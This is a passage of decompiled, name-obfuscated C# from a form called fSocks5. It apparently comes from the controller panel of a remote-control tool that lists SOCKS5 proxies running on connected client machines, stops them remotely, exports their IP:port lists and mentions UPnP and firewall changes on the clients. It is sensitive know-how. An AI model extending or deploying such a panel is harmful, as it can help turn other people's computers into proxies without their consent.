				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = string_2;
				@class.string_1 = string_;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x0600117D RID: 4477 RVA: 0x000803C8 File Offset: 0x0007E5C8
	private void method_6(object sender, FormatRowEventArgs e)
	{
		try
		{
			cSocks5cli cSocks5cli = (cSocks5cli)e.Model;
			if (cSocks5cli.bJustConnected)
			{
				e.Item.BackColor = Color.LimeGreen;
			}
			else if (!cSocks5cli.pending_dc & !cSocks5cli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.White;
			}
			else if (cSocks5cli.pending_dc & cSocks5cli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Yellow;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			else if (cSocks5cli.pending_dc & !cSocks5cli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Red;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			if (cSocks5cli.rejected)
			{
				e.Item.BackColor = Color.LightGray;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600117E RID: 4478 RVA: 0x0008051C File Offset: 0x0007E71C
	private void method_7(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_20().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x0600117F RID: 4479 RVA: 0x00080588 File Offset: 0x0007E788
	private void method_8(object sender, EventArgs e)
	{
		try
		{
			this.vmethod_12().Text = "Socks5 servers: " + Conversions.ToString(this.vmethod_20().Items.Count);
			this.vmethod_14().Text = "Selected clients: " + Conversions.ToString(Class130.fMain_0.vmethod_18().SelectedObjects.Count);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06001180 RID: 4480 RVA: 0x00080610 File Offset: 0x0007E810
	public void method_9()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fSocks5.Delegate98(this.method_9), new object[0]);
			return;
		}
		if (this.concurrentStack_0.Count > 0)
		{
			this.vmethod_20().AddObjects(this.concurrentStack_0.ToList<cSocks5cli>());
			this.concurrentStack_0.Clear();
		}
	}

	// Token: 0x06001181 RID: 4481 RVA: 0x00080678 File Offset: 0x0007E878
	public void method_10()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fSocks5.Delegate95(this.method_10), new object[0]);
			return;
		}
		if (this.concurrentStack_1.Count > 0)
		{
			this.vmethod_20().RefreshObjects(this.concurrentStack_1.ToList<cSocks5cli>());
			this.concurrentStack_1.Clear();
		}
	}

	// Token: 0x06001182 RID: 4482 RVA: 0x000806E0 File Offset: 0x0007E8E0
	public void method_11()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fSocks5.Delegate100(this.method_11), new object[0]);
			return;
		}
		if (this.concurrentStack_2.Count > 0)
		{
			this.vmethod_20().RemoveObjects(this.concurrentStack_2.ToList<cSocks5cli>());
			this.concurrentStack_2.Clear();
		}
	}

	// Token: 0x06001183 RID: 4483 RVA: 0x00009DE1 File Offset: 0x00007FE1
	private void method_12(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_9();
			this.method_10();
			this.method_11();
			Thread.Sleep(1000);
		}
	}

	// Token: 0x06001184 RID: 4484 RVA: 0x00080748 File Offset: 0x0007E948
	private void fSocks5_Load(object sender, EventArgs e)
	{
		this.vmethod_20().VirtualMode = true;
		this.vmethod_20().View = View.Details;
		this.vmethod_20().FullRowSelect = true;
		this.vmethod_20().OwnerDraw = true;
		this.vmethod_20().Columns[0].Width = 180;
		this.vmethod_20().Columns[1].Width = 100;
		this.vmethod_20().Columns[2].Width = 50;
		this.vmethod_20().Columns[3].Width = 80;
		this.vmethod_20().Columns[4].Width = 80;
		this.vmethod_20().Columns[5].Width = 80;
		this.vmethod_20().Columns[6].Width = 80;
		this.vmethod_20().Columns[7].Width = 120;
		this.vmethod_20().Columns[8].Width = 80;
		this.vmethod_20().GridLines = Class135.smethod_0().Gridlines;
		this.vmethod_38().RunWorkerAsync();
	}

	// Token: 0x06001185 RID: 4485 RVA: 0x00007348 File Offset: 0x00005548
	private void fSocks5_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x06001186 RID: 4486 RVA: 0x00009E00 File Offset: 0x00008000
	private void method_13(object sender, EventArgs e)
	{
		Interaction.MsgBox("The client will randomly pick an available port.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001187 RID: 4487 RVA: 0x00009E14 File Offset: 0x00008014
	private void method_14(object sender, EventArgs e)
	{
		this.vmethod_2().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_56().Checked, false, true));
	}

	// Token: 0x06001188 RID: 4488 RVA: 0x00080880 File Offset: 0x0007EA80
	private void method_15(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_20();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string key = ((cSocks5cli)obj).Key;
					string string_ = "socks5_srv_stop|1";
					string string_2 = key;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06001189 RID: 4489 RVA: 0x00080968 File Offset: 0x0007EB68
	private void method_16(object sender, MouseEventArgs e)
	{
		this.vmethod_24().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_20().SelectedObjects.Count > 0, true, false));
		this.vmethod_30().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_20().SelectedObjects.Count > 0, true, false));
	}

	// Token: 0x0600118A RID: 4490 RVA: 0x000809E0 File Offset: 0x0007EBE0
	private void method_17(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_20();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cSocks5cli cSocks5cli = (cSocks5cli)obj;
					stringBuilder.Append(string.Concat(new string[]
					{
						cSocks5cli.USER,
						"\t",
						cSocks5cli.IP,
						"\t",
						cSocks5cli.PORT,
						"\t",
						cSocks5cli.SENT,
						"\t",
						cSocks5cli.RECV,
						"\t",
						cSocks5cli.SPEED_DL,
						"\t",
						cSocks5cli.SPEED_UL,
						"\t",
						cSocks5cli.TARGET,
						"\t",
						cSocks5cli.DURATION,
						"\r\n"
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x0600118B RID: 4491 RVA: 0x00080B3C File Offset: 0x0007ED3C
	private void method_18(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_20();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				cSocks5cli cSocks5cli = (cSocks5cli)obj;
				stringBuilder.Append(string.Concat(new string[]
				{
					cSocks5cli.USER,
					"\t",
					cSocks5cli.IP,
					"\t",
					cSocks5cli.PORT,
					"\t",
					cSocks5cli.SENT,
					"\t",
					cSocks5cli.RECV,
					"\t",
					cSocks5cli.SPEED_DL,
					"\t",
					cSocks5cli.SPEED_UL,
					"\t",
					cSocks5cli.TARGET,
					"\t",
					cSocks5cli.DURATION,
					"\r\n"
				}));
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x0600118C RID: 4492 RVA: 0x00080C84 File Offset: 0x0007EE84
	private void method_19(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_20();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cSocks5cli cSocks5cli = (cSocks5cli)obj;
					stringBuilder.Append(cSocks5cli.IP + ":" + cSocks5cli.PORT + "\r\n");
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x0600118D RID: 4493 RVA: 0x00080D44 File Offset: 0x0007EF44
	private void method_20(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
		if (this.vmethod_6().Checked)
		{
			if (fastObjectListView.SelectedObjects == null)
			{
				return;
			}
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = "socks5_srv_stop|1";
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
				return;
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		try
		{
			foreach (object obj2 in fastObjectListView.Objects)
			{
				string sKey2 = ((CClient)obj2).sKey;
				string string_ = "socks5_srv_stop|1";
				string string_2 = sKey2;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = string_2;
				@class.string_1 = string_;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x0600118E RID: 4494 RVA: 0x00009E42 File Offset: 0x00008042
	private void method_21(object sender, EventArgs e)
	{
		Interaction.MsgBox("UPnP technology will be attempted on clients for port mapping.\r\n\r\nNote: This feature requires the client to run with elevated privileges (as administrator) as an exception needs to be added with Windows Firewall.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x0600118F RID: 4495 RVA: 0x00080F04 File Offset: 0x0007F104
	private void method_22(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_20();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cSocks5cli cSocks5cli = (cSocks5cli)obj;
					cSocks5cli.dSent = 0.0;
					cSocks5cli.dRecv = 0.0;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x040006CB RID: 1739
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x040006CC RID: 1740
	private TextBox textBox_0;

	// Token: 0x040006CD RID: 1741
	private Label label_0;

	// Token: 0x040006CE RID: 1742
	private RadioButton radioButton_0;

	// Token: 0x040006CF RID: 1743
	private RadioButton radioButton_1;

	// Token: 0x040006D0 RID: 1744
	private StatusStrip statusStrip_0;

	// Token: 0x040006D1 RID: 1745
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x040006D2 RID: 1746
	private ToolStripStatusLabel toolStripStatusLabel_1;

	// Token: 0x040006D3 RID: 1747
	private OLVColumn olvcolumn_0;

	// Token: 0x040006D4 RID: 1748
	private OLVColumn olvcolumn_1;

	// Token: 0x040006D5 RID: 1749
	private FastObjectListView fastObjectListView_0;

	// Token: 0x040006D6 RID: 1750
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x040006D7 RID: 1751
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x040006D8 RID: 1752
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x040006D9 RID: 1753
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x040006DA RID: 1754
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x040006DB RID: 1755
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x040006DC RID: 1756
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x040006DD RID: 1757
	private PictureBox pictureBox_0;

	// Token: 0x040006DE RID: 1758
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x040006DF RID: 1759
	private OLVColumn olvcolumn_2;

	// Token: 0x040006E0 RID: 1760
	private OLVColumn olvcolumn_3;

	// Token: 0x040006E1 RID: 1761
	private OLVColumn olvcolumn_4;

	// Token: 0x040006E2 RID: 1762
	private OLVColumn olvcolumn_5;

	// Token: 0x040006E3 RID: 1763
	private OLVColumn olvcolumn_6;

	// Token: 0x040006E4 RID: 1764
	private OLVColumn olvcolumn_7;

	// Token: 0x040006E5 RID: 1765
	private OLVColumn olvcolumn_8;

	// Token: 0x040006E6 RID: 1766
	private PictureBox pictureBox_1;

	// Token: 0x040006E7 RID: 1767
	private CheckBox checkBox_0;

	// Token: 0x040006E8 RID: 1768
	private ToolStripMenuItem toolStripMenuItem_5;

	// Token: 0x040006E9 RID: 1769
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x040006EA RID: 1770
	private VisualButton visualButton_0;

	// Token: 0x040006EB RID: 1771
	private VisualButton visualButton_1;

	// Token: 0x040006EC RID: 1772
	private ToolStripSeparator toolStripSeparator_2;

	// Token: 0x040006ED RID: 1773
	private ToolStripMenuItem toolStripMenuItem_6;

	// Token: 0x040006EE RID: 1774
	public ConcurrentStack<cSocks5cli> concurrentStack_0;

	// Token: 0x040006EF RID: 1775
	public ConcurrentStack<cSocks5cli> concurrentStack_1;

	// Token: 0x040006F0 RID: 1776
	public ConcurrentStack<cSocks5cli> concurrentStack_2;

	// Token: 0x02000137 RID: 311
	// (Invoke) Token: 0x06001193 RID: 4499
	private delegate void Delegate95();

	// Token: 0x02000138 RID: 312
	// (Invoke) Token: 0x06001197 RID: 4503
	private delegate void Delegate96(string string_0);

	// Token: 0x02000139 RID: 313
	// (Invoke) Token: 0x0600119B RID: 4507
	private delegate void Delegate97(string string_0, string[] string_1);

	// Token: 0x0200013A RID: 314
	// (Invoke) Token: 0x0600119F RID: 4511
	private delegate void Delegate98();

	// Token: 0x0200013B RID: 315
	// (Invoke) Token: 0x060011A3 RID: 4515
	private delegate void Delegate99(string string_0, string string_1, string string_2, string string_3);

	// Token: 0x0200013C RID: 316
	// (Invoke) Token: 0x060011A7 RID: 4519
	private delegate void Delegate100();
}
